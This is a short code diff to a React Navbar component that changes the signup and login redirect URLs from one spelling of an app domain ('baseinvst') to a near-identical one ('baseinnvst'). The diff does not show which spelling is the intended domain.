@@ -53,11 +53,11 @@ export function Navbar() {
 	}, [isMounted]);
 
 	const handleSignup = () => {
-		window.location.href = "https://app.baseinvst.com/register";
+		window.location.href = "https://app.baseinnvst.com/register";
 	};
 
 	const handleLogin = () => {
-		window.location.href = "https://app.baseinvst.com/login";
+		window.location.href = "https://app.baseinnvst.com/login";
 	};
 
 	return (
